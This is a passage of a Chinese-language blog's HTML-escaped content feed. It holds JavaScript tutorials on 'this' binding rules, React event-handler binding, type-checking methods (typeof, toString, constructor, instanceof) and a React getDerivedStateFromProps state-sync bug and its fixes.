class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  name: <span class="string">'Sarah'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line">person1.sayHi();                <span class="comment">// hello,Mike</span></span><br><span class="line">setTimeout(person2,sayHi, <span class="number">100</span>); <span class="comment">// hello,Mike</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  person2.sayHi()</span><br><span class="line">&#125;, <span class="number">200</span>)                         <span class="comment">// hello,Sarah</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-显式绑定"><a href="#3-显式绑定" class="headerlink" title="3. 显式绑定"></a>3. 显式绑定</h3><p>通过<code>call</code>, <code>apply</code>, <code>bind</code>的方式，显示的指定this的值。call,apply,bind的第一个参数，就是指定this所指向的对象。call和apply的作用一样，只是传参方式不同。call和apply都会执行对应的函数，而bind方法不会。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = person.sayHi;</span><br><span class="line">Hi.call(person);     <span class="comment">// hello,Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-1-显式绑定丢失"><a href="#3-1-显式绑定丢失" class="headerlink" title="3.1 显式绑定丢失"></a>3.1 显式绑定丢失</h4><p><code>Hi.call(person, person.sayHi)</code>的确将this绑定到Hi中的this。但在执行fn的时候，相当于直接调用了sayHi方法（没有显式板顶， person.sayHi已经赋值给fn, 隐式绑定也丢失了）。因此对应的是默认绑定。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = fucntion(fn) &#123;</span><br><span class="line">  fn();           <span class="comment">// wrong: hello,Mike</span></span><br><span class="line">  fn.call(<span class="keyword">this</span>);  <span class="comment">// true:  hello,Amy</span></span><br><span class="line">&#125;</span><br><span class="line">Hi.call(person, person.sayHi);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-new绑定"><a href="#4-new绑定" class="headerlink" title="4. new绑定"></a>4. new绑定</h3><p>在javascript中，构造函数只是使用new操作符时被调用的函数，这些函数和普通的函数并没有什么不同，它不属于某个类，也不可能实例实例出一个类。任何一个函数都可以使用new来调用，因此其实并不存在构造函数，而只有对于函数的“构造调用”。</p><p>使用new来调用函数，会自动执行下面的操作：</p><ul><li>创建一个新对象</li><li>将构造函数的作用域复制给新对象，即this指向这个新对象</li><li>执行构造函数中的代码</li><li>返回新对象</li></ul><p>因此，我们使用new来调用函数的时候，新对象会绑定到这个函数的this上。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Hi = <span class="keyword">new</span> sayHi(<span class="string">'Amy'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(Hi.name);   <span class="comment">// Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h3><h4 id="5-1-绑定优先级"><a href="#5-1-绑定优先级" class="headerlink" title="5.1 绑定优先级"></a>5.1 绑定优先级</h4><p>优先级: new绑定 &gt; 显式绑定 &gt; 隐式绑定 &gt; 默认板顶</p><h4 id="5-2-绑定null-undefined"><a href="#5-2-绑定null-undefined" class="headerlink" title="5.2 绑定null,undefined"></a>5.2 绑定null,undefined</h4><p>将null, undefined作为this的绑定对象传入call, apply, bind，这些值在调用时会被忽略，实际应用的是默认绑定规则</p><h4 id="5-3-箭头函数"><a href="#5-3-箭头函数" class="headerlink" title="5.3 箭头函数"></a>5.3 箭头函数</h4><p>箭头函数没有自己的this，因此不能用call, apply, bind这些方法去改变this的执行。它的this继承于外层代码库中的this。</p><h4 id="5-4-面试题"><a href="#5-4-面试题" class="headerlink" title="5.4 面试题"></a>5.4 面试题</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  number: <span class="number">3</span>,</span><br><span class="line">  fn: (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> number;</span><br><span class="line">    <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">    number = number * <span class="number">2</span>;</span><br><span class="line">    number = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> num = <span class="keyword">this</span>.number;</span><br><span class="line">      <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(num);</span><br><span class="line">      number *= <span class="number">3</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(number)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myFun = obj.fn;    </span><br><span class="line">myFun.call(<span class="literal">null</span>);   <span class="comment">// 10, 9</span></span><br><span class="line">obj.fn();           <span class="comment">// 3, 27</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.number)  <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10, 9, 3, 27, 20</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="5-5-React绑定事件"><a href="#5-5-React绑定事件" class="headerlink" title="5.5 React绑定事件"></a>5.5 React绑定事件</h4><p>在Javascript中，class的方法默认不会绑定<code>this</code>。如果<code>this.handleClick</code>没有bind.this，这时这个函数的this的值是undefined。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">  handleClick() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// undefined</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li>正确写法<br>注意： 在render方法中使用Function.prototype.bind, 或者使用箭头函数，都会在每次组件渲染时创建一个新的函数，可能会影响性能。应在构造函数中绑定。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wrong</span></span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.deleteRow.bind(<span class="keyword">this</span>, id)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// wrong</span></span><br><span class="line">&lt;button onClick=&#123;() =&gt; <span class="keyword">this</span>.handleClick()&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">  <span class="keyword">super</span>(props);</span><br><span class="line">  <span class="keyword">this</span>.handleClick = <span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>传递参数给事件处理器<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onClick=&#123;() =&gt; <span class="keyword">this</span>.handleClick(id)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;(e) =&gt; <span class="keyword">this</span>.handleClick(e)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;(e) =&gt; <span class="keyword">this</span>.deleteRow(id, e)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.handleClick.bind(<span class="keyword">this</span>, id)&#125;&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>  <span class="comment">// 跟上面等价</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>通过data-attributes传递参数<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;li data-letter=&#123;letter&#125; onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;</span><br><span class="line"></span><br><span class="line">handleClick(e) =&gt; &#123;</span><br><span class="line">  <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">    letter: e.target.dataset.letter</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/YvetteLau/Blog/issues/6" target="_blank" rel="noopener">嗨，你真的懂this吗？</a></li><li><a href="https://react.docschina.org/docs/faq-functions.html" target="_blank" rel="noopener">在组件中使用事件处理函数</a></li><li><a href="https://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/" target="_blank" rel="noopener">Understanding JavaScript Function Invocation and “this”</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JS数据类型</title>
      <link href="/2019/07/29/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2019/07/29/JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-typeof"><a href="#1-typeof" class="headerlink" title="1. typeof"></a>1. typeof</h3><p><em><code>typeof</code></em>判断变量属于哪个基本类型。我们可以用typeof来判断undefined, boolean, number, string, object, symbol, function这7种类型。</p><p><em><code>typeof</code></em> 实现原理 : js在底层存储变量的时候，会在变量的机器码的低位1-3位存储其类型信息: 000-对象， 010-浮点数， 100-字符串，110-布尔，1-整数，所有机器码均为0-null，-2^30整数来表示-undefined。</p><p>当<code>typeof null</code>时， 由于<code>null</code>的所有机器码均为0，因此被当做了对象来判断。因此，typeof用于判断基本数据类型，避免对null的判断。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 七种基本类型</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>      <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span>           <span class="comment">// 'boolean'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">42</span>             <span class="comment">// 'number'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">'42'</span>           <span class="comment">// 'string'</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">life</span>: <span class="number">42</span>&#125;     <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125; <span class="comment">// 'function'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Symbol</span>()       <span class="comment">// 'symbol'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// other</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">void</span> <span class="number">0</span>         <span class="comment">// 'undefined'</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]        <span class="comment">// 'object' 数组，其实也是对象</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Date</span>()     <span class="comment">// 'object'</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>           <span class="comment">// 'object' js的bug导致返回object</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-Object-prototype-toString-call"><a href="#2-Object-prototype-toString-call" class="headerlink" title="2. Object.prototype.toString.call"></a>2. Object.prototype.toString.call</h3><p>Object.prototype.toString.call() 判断对象属于哪个内置类型。</p><p>ES5中每种内置对象都定义了<em><code>[[Class]]</code></em>内部属性的值。宿主对象的[[Class]]内部属性的值可以是除了Arguments, Array, Boolean, Date, Error, Function, JSON, Math, Number, Object, RegExp, String的任何字符串。</p><p>ES6中，之前的<em><code>[[Class]]</code></em>不再使用，取而代之的是<code>internal slot</code>。Internal slots对应于与对象相关联并由各种es规范算法使用的内部状态，它们没有对象属性，也不能被继承。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">null</span>)            <span class="comment">// "[Object Null]"  </span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">undefined</span>)       <span class="comment">// "[Object Undefined]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="number">123</span>)             <span class="comment">// "[Object Number]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="literal">true</span>)            <span class="comment">// "[Object Boolean]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="string">'123'</span>)           <span class="comment">// "[Object String]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(&#123;<span class="attr">a</span>: <span class="number">123</span>&#125;)        <span class="comment">// "[Object Object]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Symbol</span>())        <span class="comment">// "[Object Symbol]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])         <span class="comment">// "[Object Array]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;)  <span class="comment">// "[Object Function]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>)        <span class="comment">// "[Object Date]"</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call(<span class="built_in">Math</span>)            <span class="comment">// "[Object Math]"</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-constructor"><a href="#3-constructor" class="headerlink" title="3. constructor"></a>3. constructor</h3><p>constructor用于判断对象的构造函数是谁<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span>.constructor        <span class="comment">// Uncaught TypeError: Cannot read property 'constructor' of null</span></span><br><span class="line"><span class="literal">undefined</span>.constructor   <span class="comment">// Uncaught TypeError: Cannot read property 'constructor' of null</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].constructor === <span class="built_in">Array</span>     <span class="comment">// true</span></span><br><span class="line">(<span class="number">123</span>).constructor === <span class="built_in">Number</span>      <span class="comment">// true</span></span><br><span class="line"><span class="string">'123'</span>.constructor === <span class="built_in">String</span>      <span class="comment">// true</span></span><br><span class="line">(&#123;<span class="attr">a</span>:<span class="number">1</span>&#125;).constructor === <span class="built_in">Object</span>    <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Symbol</span>().constructor === <span class="built_in">Symbol</span>   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">func.constructor === <span class="built_in">Function</span>     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">date.constructor === <span class="built_in">Date</span>         <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>()</span><br><span class="line">reg.constructor === <span class="built_in">RegExp</span>        <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="built_in">Math</span></span><br><span class="line">m.constructor === <span class="built_in">Math</span>            <span class="comment">// false,事实上没有Math这个构造函数，Math的构造函数在Object上</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-instanceof"><a href="#4-instanceof" class="headerlink" title="4. instanceof"></a>4. instanceof</h3><p>检测构造函数的<code>prototype</code>属性是否出现在对象原型链中的任何位置。使用对象必须是一个object，判断对象继承于哪个对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> programmer = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">programmer.prototype = <span class="keyword">new</span> person()</span><br><span class="line"><span class="keyword">let</span> mike = <span class="keyword">new</span> programmer()</span><br><span class="line"></span><br><span class="line">mike <span class="keyword">instanceof</span> programmer   <span class="comment">// true</span></span><br><span class="line">mide <span class="keyword">instanceof</span> person       <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><em><code>instanceof</code></em>的实现原理：只要右边变量的<code>prototype</code>在左边变量的原型链上即可。因此，<code>instanceof</code>在查找的过程中会遍历左边变量的原型链，直到找到右边变量的<code>prototype</code>，如果查找失败，返回<code>false</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_instance_of</span>(<span class="params">leftValue, rightValue</span>) </span>&#123;</span><br><span class="line">  left rightProto = rightValue.prototype;</span><br><span class="line">  leftValue = leftValue.__proto__;</span><br><span class="line"></span><br><span class="line">  whild(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (leftValue === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (leftValue === rightProto) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leftValue = leftValue.__proto__;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-常用判断"><a href="#5-常用判断" class="headerlink" title="5. 常用判断"></a>5. 常用判断</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// null</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNull</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj === <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isUndefined</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> obj === <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.toString.call([<span class="number">1</span>,<span class="number">2</span>]) === <span class="string">'[object Array]'</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://juejin.im/post/5aba32d9f265da239e4e1b6c" target="_blank" rel="noopener">JS灵巧判断7种类型的方式</a></li><li><a href="https://juejin.im/post/591647550ce4630069df1c4a" target="_blank" rel="noopener">谈谈 Object.prototype.toString</a></li><li><a href="https://juejin.im/post/5b0b9b9051882515773ae714" target="_blank" rel="noopener">浅谈 instanceof 和 typeof 的实现原理</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>getDerivedStateFromProps的一个bug</title>
      <link href="/2019/07/24/getDerivedStateFromProps/"/>
      <url>/2019/07/24/getDerivedStateFromProps/</url>
      <content type="html"><![CDATA[<h3 id="1-实现需求"><a href="#1-实现需求" class="headerlink" title="1. 实现需求"></a>1. 实现需求</h3><ul><li>子组件是个弹框</li><li>父组件通过props可以控制弹框出现</li><li>弹框内有一个关闭按钮，可以令弹窗消失</li></ul><p><br></p><h3 id="2-出现Bug"><a href="#2-出现Bug" class="headerlink" title="2. 出现Bug"></a>2. 出现Bug</h3><p>使用<em><code>getDerivedStateFromProps</code></em> 让组件在props变化时更新state。但实际上只要腹肌重新渲染时，这个生命周期函数就会重新调用，不管 <em><code>props</code></em> 有没有变化。因此会出现下面的bug。</p><table><thead><tr><th>操作</th><th style="text-align:center">props</th><th style="text-align:right">state</th></tr></thead><tbody><tr><td>父组件点击显示弹窗</td><td style="text-align:center">true</td><td style="text-align:right">true</td></tr><tr><td>子组件关闭弹窗后</td><td style="text-align:center">true</td><td style="text-align:right">false</td></tr><tr><td>父组件执行render函数</td><td style="text-align:center">ture</td><td style="text-align:right">true   (此时，没有点击显示弹窗，弹窗会自动弹出)</td></tr></tbody></table><p>如果父组件重新渲染，在子组件修改的所有state都会丢失。这时，<code>visible</code>不是一个单一来源的值，导致state没有正确渲染。直接将props直接复制到state是不安全的。任何数据，都应保证只有一个数据来源，而且避免直接复制它。<a href="https://codesandbox.io/s/mz2lnkjkrx" target="_blank" rel="noopener">官方示例</a></p><p><br></p><h3 id="3-解决方法"><a href="#3-解决方法" class="headerlink" title="3. 解决方法"></a>3. 解决方法</h3><h4 id="3-1-完全可受控组件"><a href="#3-1-完全可受控组件" class="headerlink" title="3.1 完全可受控组件"></a>3.1 完全可受控组件</h4><p>从组件里删除state，变量只受<code>props</code>控制，调用父组件方法修改值。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EmailInput</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">onChange</span>=<span class="string">&#123;props.onChange&#125;</span> <span class="attr">value</span>=<span class="string">&#123;props.email&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-有key的非可控组件"><a href="#3-2-有key的非可控组件" class="headerlink" title="3.2 有key的非可控组件"></a>3.2 有key的非可控组件</h4><p>让组件自己存储临时的email state，但组件可以从<code>props</code>接收初始值，但更改之后的值就与props无关。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span 